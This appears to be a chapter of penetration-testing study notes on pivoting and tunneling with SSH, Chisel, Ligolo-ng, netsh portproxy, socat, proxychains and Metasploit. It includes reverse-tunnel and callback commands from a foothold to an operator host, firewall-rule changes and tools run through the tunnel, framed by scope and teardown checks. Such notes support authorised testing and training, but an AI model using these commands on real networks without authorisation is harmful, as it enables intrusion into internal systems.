# 07 · Pivoting and tunneling

Pivoting is a **topology problem**, not a tool list. Before any command, draw the four endpoints and
the arrows between them, and prove you actually need a tunnel. The loop:

`scope → draw endpoints/arrows → prove current routes/listeners/DNS → pick the smallest
forward/reverse/bind/SOCKS/TUN primitive → start one component → validate one approved service →
add the next hop only if needed → re-enter [§01](01-recon-and-enumeration.md) → tear down
deepest-first → prove original route/interface/listener/firewall state.`

A verified tunnel is **not** authority to scan the subnet, spray credentials, execute remotely, or
touch AD — re-enter [§01](01-recon-and-enumeration.md)/[§04](04-password-attacks.md)/[§08](08-active-directory.md)
with their own scope. Reverse-shell payloads route to [§03](03-shells-and-payloads.md), credentials/
authentication to [§04](04-password-attacks.md)/[§08](08-active-directory.md), transfer method/
integrity to [§09](09-file-transfers.md), sensitive collection to [§10](10-post-exploitation-and-loot.md).

**Endpoints:** `OPERATOR` (you), `OPERATOR_BIND` (a listener you own), `PIVOT` (the foothold, with a
`PIVOT_INGRESS` and `PIVOT_EGRESS` side), `TARGET_HOST:TARGET_SERVICE`, and a `RETURN` path for
callbacks. Placeholders: `OPERATOR_IP`, `PIVOT_IP`, `AGENT_IP`, `TARGET_IP`, `INTERNAL_SUBNET`,
`DEEP_SUBNET`, `TUN_IFACE`, `SOCKS_PORT`, `RELAY_PORT`, `PORT`. **"Forward"/"reverse"/"local"/
"remote" are relative to which side listens** — name the endpoints, never assume Kali/Windows/inside/
outside. Freeze tool versions at both ends (Chisel/Ligolo/Plink/Metasploit) and never mix old and new
console syntax in one block.

**Jump:** [scope/topology](#71-scope-need-and-four-endpoint-topology) ·
[baseline/choice](#72-baseline-and-choosing-the-smallest-path) ·
[SSH -L/-R/-D](#73-ssh-local-remote-and-dynamic-forwarding) · [jump/sshuttle](#74-ssh-jump-hosts-and-sshuttle) ·
[Chisel forwards](#75-chisel-one-port-forwards) · [Chisel SOCKS](#76-chisel-reverse-socks) ·
[Ligolo bootstrap](#77-ligolo-bootstrap) · [Ligolo route](#78-ligolo-interface-and-route-lifecycle) ·
[Ligolo listeners](#79-ligolo-listeners-and-pivot-local-services) · [multi-hop](#710-multi-hop-and-double-pivot) ·
[Windows forwards](#711-windows-native-forwarding) · [Socat relays](#712-socat-and-one-port-relays) ·
[Proxychains/DNS](#713-proxychains-dns-and-protocol-limits) · [Metasploit](#714-metasploit-routing-companion) ·
[callback/transfer](#715-callback-and-transfer-paths) · [verify/troubleshoot](#716-verification-and-troubleshooting-ladder) ·
[re-enumerate](#717-re-enter-enumeration-through-the-pivot) · [teardown](#718-evidence-teardown-and-restoration).

## 7.1 Scope, need, and four-endpoint topology

Before tunnelling, confirm written scope (authorised networks/hosts/services) and your current
foothold identity, then draw the path and prove a direct route does **not** already work.

```bash
# Prove the pivot's reachability and that OPERATOR can't reach the target directly:
ip a; ip route                       # (Linux pivot) second NIC / reachable subnet?
nc -zv TARGET_IP TARGET_PORT         # direct attempt from OPERATOR — does it already work?
```
```cmd
ipconfig /all & route print          :: (Windows pivot) interfaces and routes
```

Write the topology line before choosing a tool, e.g.
`OPERATOR → OPERATOR_BIND:SOCKS_PORT → PIVOT_EGRESS → TARGET_HOST:TARGET_SERVICE`, naming who
listens, who dials, and **where the destination name is resolved**. Reachability from the pivot does
not by itself authorise scanning the subnet. Record a start/stop owner and a teardown entry for every
component **at creation time** ([§7.18](#718-evidence-teardown-and-restoration)).

## 7.2 Baseline and choosing the smallest path

Enumerate the current network state, then pick the least-change primitive that carries the required
**protocol**. A tunnel is not a default requirement.

```bash
ip -br address; ip route; ss -tlnp            # interfaces, routes, existing listeners (Linux)
cat /etc/resolv.conf                          # who resolves names?
```

| Need | Smallest primitive | Section |
|---|---|---|
| One TCP service, you can SSH the pivot | SSH `-L` local forward | [§7.3](#73-ssh-local-remote-and-dynamic-forwarding) |
| Many TCP services / a whole app | SSH `-D` SOCKS or Chisel reverse SOCKS | [§7.3](#73-ssh-local-remote-and-dynamic-forwarding) / [§7.6](#76-chisel-reverse-socks) |
| Internal host must reach **you** | SSH `-R` / reverse Chisel / Ligolo listener | [§7.3](#73-ssh-local-remote-and-dynamic-forwarding) / [§7.9](#79-ligolo-listeners-and-pivot-local-services) |
| Whole subnet(s), native tools | Ligolo TUN or sshuttle | [§7.8](#78-ligolo-interface-and-route-lifecycle) / [§7.4](#74-ssh-jump-hosts-and-sshuttle) |
| Windows pivot, no SSH | Chisel / Ligolo / `netsh portproxy` | [§7.5](#75-chisel-one-port-forwards)–[§7.11](#711-windows-native-forwarding) |

**Protocol reality (record before choosing a scanner/app):** SOCKS/Proxychains carries proxied
application **TCP**; it does not transparently carry raw SYN, ICMP, arbitrary UDP, or every app's DNS.
A TUN interface does not guarantee raw-packet equivalence — check the pinned tool/version's TCP/UDP/
ICMP/DNS/raw behaviour ([§7.13](#713-proxychains-dns-and-protocol-limits)).

## 7.3 SSH local, remote, and dynamic forwarding

`-L`, `-R`, and `-D` are **different** consumers — keep them distinct. Each needs SSH auth to the
pivot; add `-N -f` to background without a shell, and end the process in cleanup.

**`-L` local forward** — `OPERATOR → OPERATOR_BIND(127.0.0.1:LPORT) → PIVOT → TARGET_HOST:TARGET_SERVICE`
(destination resolved by the **SSH server**):
```bash
ssh -L 127.0.0.1:8080:TARGET_IP:80 -N -f user@PIVOT_IP      # reach one internal service at localhost:8080
smbclient -L //127.0.0.1 -U user                            # e.g. after -L ...:445
```
Bind to loopback unless a stated need requires wider exposure; watch for local-port collisions.

**`-R` remote forward** — `INTERNAL_HOST → PIVOT(listener) → SSH tunnel → OPERATOR_BIND` (internal host
reaches **your** service via the pivot):
```bash
ssh -R 8888:localhost:80 -N -f user@PIVOT_IP                # expose your :80 as PIVOT:8888
```
**Correction:** a default OpenSSH `-R` listener binds only the **server's loopback** — other internal
hosts cannot reach `PIVOT:8888` unless you bind explicitly (`-R 0.0.0.0:8888:...`) **and** the server
sets `GatewayPorts clientspecified/yes`. The old note conflated operator and internal reachability.

**`-D` dynamic SOCKS** — `OPERATOR(app) → OPERATOR_BIND(127.0.0.1:SOCKS_PORT) → PIVOT egress`:
```bash
ssh -D 127.0.0.1:1080 -N -f user@PIVOT_IP                   # then wrap TCP apps via proxychains (§7.13)
```
**Correction:** "proxychains everything" is false — this carries wrapped **TCP** apps only; DNS is a
separate decision and UDP/ICMP/raw do not traverse it. Validate with one in-scope TCP connection, then
`pkill -f "ssh -D 127.0.0.1:1080"` (target the exact process, not a broad pattern).

## 7.4 SSH jump hosts and sshuttle

**ProxyJump (`-J`)** — an **SSH-only connection chain**, not a general subnet route:
```bash
ssh -J user@JUMP_IP user@TARGET_IP           # each hop needs its own auth + host-key trust
scp -J user@JUMP_IP localfile user@TARGET_IP:/path
```
Use only for SSH-aware consumers (ssh/scp/sftp). Verify host keys per hop; remove any temporary host
alias/control socket you created.

**sshuttle** — route-like TCP access to selected subnets over SSH:
```bash
sshuttle -r user@PIVOT_IP INTERNAL_SUBNET                     # e.g. one or more CIDR subnets
sshuttle -r user@PIVOT_IP INTERNAL_SUBNET DEEP_SUBNET -x PIVOT_IP   # exclude the pivot path itself
```
**Corrections:** it is **not** a full VPN — it carries **TCP (and can proxy DNS)**, needs local root/
firewall privileges and Python on the pivot, and does not carry arbitrary UDP/ICMP/raw. Exclude the
SSH path (`-x`) to avoid capturing your own connection, and stop the process to remove its temporary
firewall/routing state. Linux pivot only.

## 7.5 Chisel one-port forwards

Chisel's **client dials the server**; placement follows reachability, not "server = always Kali".
Reverse tunnels (`--reverse` on the server) let a firewalled pivot dial out and open ports back.
Freeze compatible versions at both ends and record auth/TLS/fingerprint.

**Reverse single-port forward** — `OPERATOR(127.0.0.1:8080) ← reverse transport ← PIVOT →
TARGET_HOST:80`:
```bash
# OPERATOR (server):
chisel server -p 8888 --reverse                 # (add --auth user:pass; pin the version)
# PIVOT (client, dials out):
./chisel client OPERATOR_IP:8888 R:8080:TARGET_IP:80    # reach internal :80 at OPERATOR 127.0.0.1:8080
```

**Forward single-port** (only when OPERATOR can reach the pivot inbound — opens a pivot listener, so
weigh exposure):
```bash
# PIVOT (server):  ./chisel server -p 8888 --socks5
# OPERATOR (client): chisel client PIVOT_IP:8888 1080:socks
```

Success is service-level reachability through the OPERATOR listener. Stop on version mismatch,
untrusted server identity, listener collision, or blocked egress; kill both processes and confirm both
the transport and forwarded listeners are gone. Do not open a pivot inbound port without a scope
reason. `--reverse`/reverse-remote grammar is version-sensitive — `NEEDS-REVIEW` against the pinned
Chisel release.

## 7.6 Chisel reverse SOCKS

`OPERATOR(app) → OPERATOR_BIND(127.0.0.1:1080 SOCKS) ← reverse transport ← PIVOT egress → many
TARGET_HOSTs`. Use when the pivot must dial out and you need many TCP services:
```bash
# OPERATOR (server):
chisel server -p 8888 --reverse --auth user:pass
# PIVOT (client):
./chisel client OPERATOR_IP:8888 R:1080:socks
```
Then wrap TCP tools with proxychains ([§7.13](#713-proxychains-dns-and-protocol-limits)). Success is a
connected session plus one verified proxied TCP request. This carries **TCP** only (DNS is a separate
decision; no raw/ICMP/UDP). Prefer an authenticated channel; self-signed/disabled verification is a
disposable-lab exception, not the default. Cleanup: stop client then server, confirm the SOCKS listener
is closed.

## 7.7 Ligolo bootstrap

Ligolo-ng is a **userland relay** that presents a TUN interface; the agent dials the proxy. Choose one
frozen generation and do not mix legacy `start` with the modern `interface_create`/`tunnel_start`
verbs. Prefer certificate pinning over `-ignore-cert`.

```bash
# OPERATOR (proxy) — modern (0.6+) generation:
./proxy -selfcert                                   # disposable-lab cert; note the fingerprint
ligolo-ng » certificate_fingerprint                 # pin this for the agent
ligolo-ng » interface_create --name ligolo          # creates the TUN (replaces manual ip tuntap)

# PIVOT (agent) dials back — prefer fingerprint pinning over -ignore-cert:
./agent -connect OPERATOR_IP:11601 -accept-fingerprint <FINGERPRINT>
```

```bash
# OPERATOR: select the session and start the tunnel bound to that agent
ligolo-ng » session
[Agent : user@host] » ifconfig                      # confirm the agent's reachable subnets
[Agent : user@host] » tunnel_start --tun ligolo
```

**Corrections:** `-selfcert` + `-ignore-cert` is a lab shortcut, not a secure default — record the
fingerprint and pin it. If the pivot **cannot** dial out but you can reach it inbound, use agent
bind-mode (`./agent -bind 0.0.0.0:RELAY_PORT` then `ligolo-ng » connect_agent --ip PIVOT_IP:RELAY_PORT`)
— `NEEDS-REVIEW` against the pinned release. On Windows agents, open only the needed port with a
specific rule (`New-NetFirewallRule -DisplayName oscp -Direction Inbound -LocalPort PORT -Protocol TCP
-Action Allow`); **do not disable the whole firewall**.

## 7.8 Ligolo interface and route lifecycle

`OPERATOR(native app) → TUN_IFACE route → Ligolo proxy → agent → INTERNAL_SUBNET`. Add a route only
after checking it does not overlap or capture an existing one; record interface/route ownership for
exact removal.

```bash
[Agent : user@host] » interface_add_route --name ligolo --route INTERNAL_SUBNET   # console-managed route
# (legacy/OS-managed equivalent — pick ONE model, don't run both as mandatory:)
# sudo ip route add INTERNAL_SUBNET dev ligolo
evil-winrm -i TARGET_IP -u user -p 'pass'           # native tool over the route (auth → §04/§08)
```

**Corrections:** a TUN interface does **not** grant full raw/ICMP/UDP/SYN-scan equivalence — the agent
translates a version-specific protocol set. Because the agent is usually unprivileged, use
`nmap -sT --unprivileged TARGET_IP` and do not assume SYN/ping behaviour. Validate one service, not
just "the route exists". Choose console-managed **or** OS-managed routes as the main path, not both.
Cleanup removes the route then the interface (`interface_delete --name ligolo`, or `ip route del ...` /
`ip link del ligolo` for the OS-managed form).

## 7.9 Ligolo listeners and pivot-local services

**Reverse listener** — `INTERNAL_HOST → PIVOT_BIND(agent:RELAY_PORT) → Ligolo transport →
OPERATOR_BIND(127.0.0.1:PORT)`. Use for callbacks/transfers when an internal host cannot reach you
directly:
```bash
# OPERATOR service already listening (e.g. python3 -m http.server 8888 / nc -lvnp 4444), then:
[Agent : user@host] » listener_add --addr 0.0.0.0:RELAY_PORT --to 127.0.0.1:PORT --tcp
[Agent : user@host] » listener_list
[Agent : user@host] » listener_stop <id>            # exact teardown
```
Internal host targets `AGENT_IP:RELAY_PORT`. A `0.0.0.0` bind exposes the listener to the whole
segment — bind narrowly and justify any wildcard; payloads route to [§03](03-shells-and-payloads.md),
transfers to [§09](09-file-transfers.md).

**Pivot-local (127.0.0.1) service:** the reliable modern approach is a listener that maps the agent's
loopback service outward, or a dedicated Ligolo route to a reserved range. **Correction/`NEEDS-REVIEW`:**
the old "add `240.0.0.1` to the pivot's loopback + fake route" trick mutates pivot addressing and is
version-dependent — do **not** add an address to the pivot unless the pinned release explicitly
requires it, and if tested, remove it immediately.

## 7.10 Multi-hop and double pivot

`OPERATOR → PIVOT1 → PIVOT2 → DEEP_SUBNET`. Build one hop at a time, validate it, then add the next;
give every hop a **unique** agent/interface/port/route and tear down deepest-first.

**Ligolo double pivot** (cleanest): relay the proxy port through agent 1, run agent 2 through it, and
give agent 2 its own interface and route:
```bash
# On PIVOT1's session, relay inbound RELAY_PORT to the proxy's control port:
[Agent1 : ...] » listener_add --addr 0.0.0.0:RELAY_PORT --to 127.0.0.1:11601 --tcp
# PIVOT2 (agent 2) dials PIVOT1:
./agent -connect PIVOT1_IP:RELAY_PORT -accept-fingerprint <FINGERPRINT>
# OPERATOR: distinct interface + deeper route for the new session:
ligolo-ng » interface_create --name lig2
[Agent2 : ...] » tunnel_start --tun lig2
[Agent2 : ...] » interface_add_route --name lig2 --route DEEP_SUBNET
```

**SSH nested** alternative (SSH-capable hops): `ssh -D 1080 -N -f user@PIVOT1` then
`proxychains4 ssh -D 1081 -N -f user@PIVOT2`, and point final tools at `127.0.0.1:1081`. **Correction:**
a locally-run second proxy is not automatically "reachable through the first proxy" — draw each proxy
from the consumer's perspective and avoid duplicating a hop in both a nested transport and a proxy
list. Tear down inner→outer; confirm each listener/route/interface is gone before removing the next.

## 7.11 Windows-native forwarding

**`netsh portproxy`** — `CONSUMER → WINDOWS_PIVOT(listenaddress:listenport) → TARGET_HOST:port`,
**TCP-only**, requires admin and the IP Helper service. Snapshot state, then delete the exact entry:
```cmd
netsh interface portproxy show all                                              :: baseline first
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8080 ^
  connectaddress=TARGET_IP connectport=80
netsh advfirewall firewall add rule name="oscp8080" dir=in action=allow protocol=TCP localport=8080
:: cleanup — remove the exact rule and entry:
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8080
netsh advfirewall firewall delete rule name="oscp8080"
```
The presence of a rule is not reachability proof — validate the service through the intended interface.

**Plink** (PuTTY CLI): follows SSH direction semantics from the **Windows client**. **Correction:**
`plink -D 1080 user@SSH_SERVER` puts the SOCKS listener on the *Windows client* and makes its SSH
server perform onward connections — it does **not** create an operator-through-Windows path. Do not put
a password on the command line; cache the host key and authenticate non-interactively. Defer the exact
replacement topology until version-tested (`NEEDS-REVIEW`).

## 7.12 Socat and one-port relays

A single-port relay, **not** a transparent subnet tunnel. `CONSUMER → PIVOT(TCP-LISTEN) →
TARGET_HOST:port`:
```bash
socat TCP-LISTEN:RELAY_PORT,fork,reuseaddr TCP:TARGET_IP:445    # relay one internal TCP service
# callback relay (direction only; payload → §03):
socat TCP-LISTEN:RELAY_PORT,fork TCP:OPERATOR_IP:PORT
```
Bind narrowly (avoid unexplained wildcards), mind fork/concurrency, and kill the exact process in
cleanup. `netcat` serves only as a **one-port listener/connectivity validator** (`nc -lvnp`,
`nc -zv`), not a subnet tunnel. **Correction/`EXCLUDE`:** the old `OPENSSL-LISTEN ... verify=0` recipe
had an ambiguous two-ended topology and disabled peer verification — rebuild from current upstream docs
with real verification before use; do not copy it.

## 7.13 Proxychains, DNS, and protocol limits

Wrap a TCP application through a local SOCKS endpoint. `WRAPPED_APP → proxychains → 127.0.0.1:SOCKS_PORT
→ pivot transport → TARGET`:
```bash
# /etc/proxychains4.conf
dynamic_chain           # skip dead proxies (vs strict_chain for an ordered multi-hop)
proxy_dns               # see correction below
[ProxyList]
socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081   # add a second line for a proxy-list multi-hop
```
```bash
proxychains4 nmap -sT -Pn -p 21,22,80,135,139,445,3389,5985 TARGET_IP   # TCP connect, no ping
proxychains4 netexec smb INTERNAL_SUBNET               # often better than proxied nmap for SMB (→ §01)
proxychains4 nc -zv TARGET_IP 445                       # quick reachability proof
```

**Corrections:** SOCKS carries proxied **TCP** — raw SYN, ICMP and general UDP do not traverse it, so
Nmap needs `-sT -Pn` (SYN/ping would bypass or hang). `proxy_dns` routes name lookups through the
proxy but does **not** guarantee every application's DNS is proxied (apps doing their own UDP/DoH/raw
resolution can leak) — decide name resolution explicitly. Treat proxied-scan "host down" as a possible
false negative, keep the target/port set small, and do **not** pair a "reduce parallelism" instruction
with an aggressive `--min-rate`. Remove task-specific proxy entries afterwards.

## 7.14 Metasploit routing companion

`meterpreter session → framework route → optional local SOCKS/port-forward`. This is framework-internal
routing, distinct from OS routing, and is a **deferred companion**:
```bash
meterpreter > run autoroute -s INTERNAL_SUBNET
msf6 > use auxiliary/server/socks_proxy   # set VERSION 5 / SRVPORT 1080 ; run -j
meterpreter > portfwd add -l 8080 -p 80 -r TARGET_IP
```
**`NEEDS-REVIEW`/DEFER:** module names/options and the OSCP exam's Metasploit allowance are volatile —
verify the installed framework and the **current official exam guide** before relying on this; the
"counts as MSF use" claim is dated context, not established fact. Keep Metasploit out of the default
core path; remove routes/jobs/forwards and close the session in cleanup.

## 7.15 Callback and transfer paths

In `07` these are **direction/endpoint proofs only** — the payload belongs to
[§03](03-shells-and-payloads.md) and transfer method/integrity to [§09](09-file-transfers.md).

**Callback relay** — `INTERNAL_HOST → PIVOT_LISTENER → OPERATOR_LISTENER`. Bring up the operator
listener first, map every bind/port, then prove one benign connection reaches the right listener before
any dependent workflow. Candidate mechanisms: SSH `-R`, reverse Chisel forward, Ligolo listener, or a
Socat relay — pick by which side can dial which.

**Transfer relay** — `INTERNAL_CLIENT → PIVOT_RELAY → OPERATOR_FILE_SERVICE` (or a jump-host copy):
```bash
# OPERATOR: python3 -m http.server 80 ; PIVOT relays it inward (or use a Ligolo listener):
socat TCP-LISTEN:8080,fork TCP:OPERATOR_IP:80
# INTERNAL target pulls, then verify size/hash (→ §09):
wget http://PIVOT_IP:8080/<artifact>
```
Success is an integrity-checked file at the destination (not just an HTTP 200). Expose only the
intended file/service, stop temporary services/relays, and remove temporary artifacts.

## 7.16 Verification and troubleshooting ladder

Validate **control plane and data plane separately** — a running process is not a working path. Climb
the layers and change one variable at a time:

```text
process/listener  → ss -tlnp | grep SOCKS_PORT            (does the listener exist, and where is it bound?)
control connection→ chisel/ligolo session shown; ssh -v   (is the transport actually up?)
route/interface   → ip route ; ip -br address             (correct dev/route, no overlap?)
DNS/name          → resolve the name via the intended path (leak? wrong resolver?)
TCP/UDP behaviour → proxychains4 nc -zv TARGET_IP PORT     (protocol actually carried?)
target service    → application-level request to TARGET_SERVICE
application/auth   → credentials/authorisation → §04/§08 (a routing failure is not an auth failure)
```

Run a **direct-path control** before blaming the tunnel, and distinguish target refusal vs route
failure vs DNS vs firewall vs proxy incompatibility vs timeout vs auth. Do not skip from "process
started" to "internal host compromised". Revert diagnostic verbosity, temporary ports, and test routes
afterwards.

## 7.17 Re-enter enumeration through the pivot

One **validated** internal host/service is a fresh [§01](01-recon-and-enumeration.md) target with its
own scope, rate, and authorisation — not licence to sweep the subnet. Broad internal scanning or an
authenticated subnet sweep is **not** a tunnel success test: prove one approved service, then re-enter
enumeration deliberately. Credential testing routes to [§04](04-password-attacks.md), AD to
[§08](08-active-directory.md), and post-exploitation to [§10](10-post-exploitation-and-loot.md), each
with fresh scope. Route success ≠ service authentication ≠ remote authorisation ≠ command execution —
keep those stages separate.

## 7.18 Evidence, teardown, and restoration

Create a teardown entry for each component **when you start it**; on completion/failure/handoff, remove
**deepest hop first** and verify after each step.

```text
Inventory to restore (deepest-first):
- processes/sessions: exact PID/session (never a broad `pkill` when the identity is known)
- listeners: SOCKS/relay/forward ports closed (ss -tlnp confirms absence)
- Ligolo: listener_stop → route removed → interface_delete; agent stopped
- routes/interfaces: `ip route del …`; `ip link del TUN_IFACE`
- Windows: `netsh portproxy delete …`; `netsh advfirewall firewall delete rule …`;
  re-enable any firewall profile you changed (prefer a specific rule over disabling it)
- config: proxychains entries, /etc/hosts, resolver changes reverted
- artifacts: disposable certs/keys and transferred files removed
```

Prove the original route/interface/listener/firewall state is back. No leftover tunnels, routes, TUN
devices, portproxy entries, wildcard listeners, disabled firewalls, or inline secrets. Broad scanning,
credentials, AD abuse, payloads, and collection are **not** part of teardown — they are separate,
independently authorised routes.

## References

- Tool syntax and protocol behaviour drift (Chisel/Ligolo generations, `netsh`, Plink, proxychains,
  Metasploit modules, sshuttle) — freeze the version at both ends and mark unverified forms
  `NEEDS-REVIEW` against current upstream/official docs. Exam tool-allowance claims must come from the
  current official guide, not stored notes.
- Chapter handoffs are linked inline: recon [§01](01-recon-and-enumeration.md), shells
  [§03](03-shells-and-payloads.md), passwords [§04](04-password-attacks.md), Active Directory
  [§08](08-active-directory.md), transfers [§09](09-file-transfers.md), loot
  [§10](10-post-exploitation-and-loot.md).
